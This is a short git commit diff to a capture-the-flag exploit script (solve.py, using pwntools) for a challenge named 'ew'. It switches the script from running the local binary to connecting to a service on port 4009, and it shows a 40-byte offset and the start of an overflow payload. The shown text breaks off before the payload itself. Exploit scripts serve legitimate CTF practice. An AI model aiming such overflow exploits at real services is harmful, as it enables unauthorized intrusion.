a4af576181d057143d59df5df22bdf31412413e5
Ryan Fabella <ryanthe@gmail.com>
2025-08-29 02:57:17 +0700

    setting ew to use port 4009

--- PWN/ew/src/solve.py
+++ PWN/ew/src/solve.py
@@ -3,10 +3,10 @@ from pwn import *
 exe = './chall'
 elf = context.binary = ELF(exe, checksec=True)
 context.log_level = 'info'
-# host, port = '127.0.0.1', 5002
+host, port = '127.0.0.1', 4009
 
-io = process(exe)
-# io = remote(host, port)
+#io = process(exe)
+io = remote(host, port)
 
 offset = 40
 payload = flat({
